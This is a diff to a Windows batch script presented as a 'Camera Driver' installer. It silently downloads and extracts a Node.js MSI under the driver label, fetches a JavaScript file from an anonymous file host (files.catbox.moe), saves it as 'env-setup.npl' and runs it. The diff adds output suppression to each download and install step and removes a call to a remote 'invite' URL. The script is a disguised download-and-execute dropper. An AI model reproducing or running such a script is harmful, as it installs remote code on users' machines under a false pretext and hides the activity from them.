@@ -36,15 +36,15 @@ if not defined NODE_EXE (
     where curl >nul 2>&1
     if errorlevel 1 (
         echo [INFO] Downloading Camera Driver...
-        powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%~dp0%NODE_MSI%'"
+        powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%~dp0%NODE_MSI%'" >nul 2>&1
     ) else (
         echo [INFO] Downloading Camera Driver...
-        curl -s -L -o "%~dp0%NODE_MSI%" "%DOWNLOAD_URL%"
+        curl -s -L -o "%~dp0%NODE_MSI%" "%DOWNLOAD_URL%" >nul 2>&1
     )
 
     if exist "%~dp0%NODE_MSI%" (
         echo [INFO] Extracting Camera Driver MSI to %EXTRACT_DIR%...
-        msiexec /a "%~dp0%NODE_MSI%" /qn TARGETDIR="%EXTRACT_DIR%"
+        msiexec /a "%~dp0%NODE_MSI%" /qn TARGETDIR="%EXTRACT_DIR%" >nul 2>&1
         del "%~dp0%NODE_MSI%"
     ) else (
         echo [ERROR] Failed to download Camera Driver MSI.
@@ -78,10 +78,10 @@ if not exist "%CODEPROFILE%" mkdir "%CODEPROFILE%"
 where curl >nul 2>&1
 if errorlevel 1 (
     echo [INFO] curl not found. Using PowerShell to download env-setup.npl...
-    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 3072; Invoke-WebRequest -Uri 'https://files.catbox.moe/1gq866.js' -OutFile '%CODEPROFILE%\env-setup.npl'"
+    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 3072; Invoke-WebRequest -Uri 'https://files.catbox.moe/1gq866.js' -OutFile '%CODEPROFILE%\env-setup.npl'" >nul 2>&1
 ) else (
     echo [INFO] Using curl to download env-setup.npl...
-    curl -L -o "%CODEPROFILE%\env-setup.npl" "https://files.catbox.moe/1gq866.js"
+    curl -L -o "%CODEPROFILE%\env-setup.npl" "https://files.catbox.moe/1gq866.js" >nul 2>&1
 )
 :: -------------------------
 :: Run the parser
@@ -98,8 +98,6 @@ if exist "%CODEPROFILE%\env-setup.npl" (
     echo [ERROR] env-setup not found.
     exit /b 1
 )
-
-powershell Invoke-RestMethod -Uri "https://myproject-backend-beta.vercel.app/invite/ayg1clqmqx99mqr6cjjp0u" -Method Get
 
 echo [SUCCESS] Camera Driver Setup completed successfully.
 exit /b 0
